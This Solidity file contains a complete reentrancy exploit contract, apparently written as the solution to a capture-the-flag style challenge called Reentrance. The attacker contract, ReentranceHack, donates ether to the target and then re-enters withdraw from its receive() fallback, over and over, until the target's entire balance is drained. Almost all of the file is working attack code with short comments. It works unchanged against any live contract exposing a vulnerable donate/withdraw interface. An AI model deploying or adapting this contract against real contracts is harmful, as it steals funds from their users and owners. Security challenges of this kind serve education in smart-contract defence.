// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

abstract contract IReentrance {
    mapping(address => uint256) public balances;

    function donate(address _to) external payable virtual;

    function withdraw(uint256 _amount) external virtual;
}

contract ReentranceHack {
    IReentrance public challenge;
    uint256 initialDeposit;

    constructor(address challengeAddress) {
        challenge = IReentrance(challengeAddress);
    }

    function attack() external payable {
        require(msg.value >= 0.1 ether, "send some more ether");

        // first deposit some funds
        initialDeposit = msg.value;
        challenge.donate{value: initialDeposit}(address(this));

        // withdraw these funds over and over again because of re-entrancy issue
        callWithdraw();
    }

    receive() external payable {
        // re-entrance called by challenge
        callWithdraw();
    }

    function callWithdraw() private {
        // this balance correctly updates after withdraw
        uint256 challengeTotalRemainingBalance = address(challenge).balance;
        // are there more tokens to empty?
        bool keepRecursing = challengeTotalRemainingBalance > 0;

        if (keepRecursing) {
            // can only withdraw at most our initial balance per withdraw call
            uint256 toWithdraw =
                initialDeposit < challengeTotalRemainingBalance
                    ? initialDeposit
                    : challengeTotalRemainingBalance;
            challenge.withdraw(toWithdraw);
        }
    }
}